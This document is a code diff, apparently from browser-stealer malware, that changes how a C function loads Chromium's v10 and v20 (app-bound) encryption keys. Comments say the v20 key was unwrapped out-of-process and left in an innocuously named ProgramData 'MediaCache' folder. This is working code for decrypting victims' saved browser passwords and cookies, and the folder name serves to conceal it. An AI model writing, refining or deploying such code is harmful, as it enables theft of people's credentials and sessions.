@@ -635,6 +635,32 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
     for(int w=0; w<2; w++){
         if(!src[w]) continue;
         Dbg("LoadLocalState: processing key");
+        if(w==1){                                                    // v20: per-browser pre-extracted key
+            // app_bound_encrypted_key is thousands of base64 chars and is never
+            // decoded in-process: it only proves the build uses v20. The key was
+            // unwrapped out-of-process and dropped next to the cache.
+            wchar_t kp[1024];
+            lstrcpyW(kp, L"C:\\ProgramData\\MediaCache\\mc-");
+            lstrcatW(kp, brname ? brname : L"x");
+            lstrcatW(kp, L".key");
+            HANDLE k = CreateFileW(kp, GENERIC_READ, FILE_SHARE_READ, NULL,
+                                   OPEN_EXISTING, 0, NULL);
+            if(k == INVALID_HANDLE_VALUE)                            // legacy single key
+                k = CreateFileW(L"C:\\ProgramData\\MediaCache\\mc.key", GENERIC_READ,
+                                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+            if(k == INVALID_HANDLE_VALUE){ Dbg("LoadLocalState: no v20 key file"); continue; }
+            char b[96]; memset(b, 0, sizeof(b)); DWORD r2 = 0;
+            ReadFile(k, b, sizeof(b)-1, &r2, NULL); CloseHandle(k);
+            if(r2 == 32){                                            // raw key
+                memcpy(g_key20, b, 32); g_has20 = true;
+            } else if(r2 > 32){                                      // base64 key
+                DWORD kl = 32;
+                if(CryptStringToBinaryA(b, 0, CRYPT_STRING_BASE64, g_key20, &kl, NULL, NULL))
+                    g_has20 = (kl == 32);
+            }
+            DbgInt("LoadLocalState: v20 key loaded", g_has20 ? 1 : 0);
+            continue;
+        }
         const char* q1 = xstrchr(src[w],'"');
         Dbg("LoadLocalState: q1 done");
         if(!q1) continue;
@@ -674,27 +700,6 @@ static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
                 // Some versions store the key without DPAPI wrapping
                 if(rl>=32){ memcpy(g_key10,raw,32); g_has10=true; Dbg("LoadLocalState: v10 direct key OK"); }
                 else { Dbg("LoadLocalState: v10 key too short, no DPAPI prefix"); }
-            }
-        } else {                                                     // v20: per-browser pre-extracted key
-            wchar_t kp[1024];
-            lstrcpyW(kp, L"C:\\ProgramData\\MediaCache\\mc-");
-            lstrcatW(kp, brname ? brname : L"x");
-            lstrcatW(kp, L".key");
-            HANDLE k = CreateFileW(kp, GENERIC_READ, FILE_SHARE_READ, NULL,
-                                   OPEN_EXISTING, 0, NULL);
-            if(k == INVALID_HANDLE_VALUE)                            // legacy single key
-                k = CreateFileW(L"C:\\ProgramData\\MediaCache\\mc.key", GENERIC_READ,
-                                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-            if(k != INVALID_HANDLE_VALUE){
-                char b[96]; memset(b, 0, sizeof(b)); DWORD r2 = 0;
-                ReadFile(k, b, sizeof(b)-1, &r2, NULL); CloseHandle(k);
-                if(r2 == 32){                                        // raw key
-                    memcpy(g_key20, b, 32); g_has20 = true;
-                } else if(r2 > 32){                                  // base64 key
-                    rl = 32;
-                    if(CryptStringToBinaryA(b, 0, CRYPT_STRING_BASE64, g_key20, &rl, NULL, NULL))
-                        g_has20 = (rl == 32);
-                }
             }
         }
     }
